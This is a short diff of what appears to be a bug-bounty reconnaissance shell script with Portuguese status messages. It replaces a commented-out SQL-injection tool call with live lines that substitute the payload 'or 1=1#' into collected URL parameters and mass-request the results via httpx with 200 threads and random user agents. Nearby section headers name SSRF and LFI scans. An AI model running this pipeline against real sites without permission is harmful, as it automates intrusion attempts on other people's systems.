@@ -108,8 +108,9 @@ mkdir ssrfScan; mv ssrf ssrfScan/;
 
 echo "Iniciando procura por SQLinjection GOOGLE" | notify;
 cat url200 | gf sqli | anew sqli;
-#python3 /root/tools/BugBountyTools/SQLi/SQLI.py sqli /root/tools/BugBountyTools/payloads/boolErrorBasedPayload.txt | anew sqli_results.txt | notify;
-#mkdir sqliScan; mv sqli_results.txt sqliScan/; mv sqli sqliScan/;
+cat sqli | qsreplace "'or 1=1#" | anew sqli_results.txt;
+cat sqli_results.txt | httpx -threads 200 -random-agent -mc 200 -o sqli200 | notify;
+mkdir sqliScan; mv sqli_results.txt sqliScan/; mv sqli sqliScan/; mv sqli200 sqliScan/;
 
 #########################################################################################################################
 ########################################################### lfi#########################################################
